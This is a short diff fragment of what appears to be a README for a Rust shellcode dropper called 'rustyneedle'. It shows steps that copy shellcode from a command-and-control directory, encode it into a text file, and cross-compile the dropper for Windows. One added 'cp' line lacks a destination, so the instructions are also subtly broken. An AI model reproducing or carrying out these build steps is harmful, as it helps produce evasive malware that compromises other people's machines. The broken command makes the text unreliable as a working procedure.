@@ -30,9 +30,10 @@ cp ~/c2/shellcode.bin .
 python3 rustyneedle/encode.py shellcode.bin 3 note.txt
 
 # Compile the main.rs dropper
+cargo build --target x86_64-pc-windows-gnu --release
 
 # Navigate the binary
-cd target/x86_64-pc-windows-gnu/release
+cp target/x86_64-pc-windows-gnu/release/rustyneedle.exe
 
 ```
 
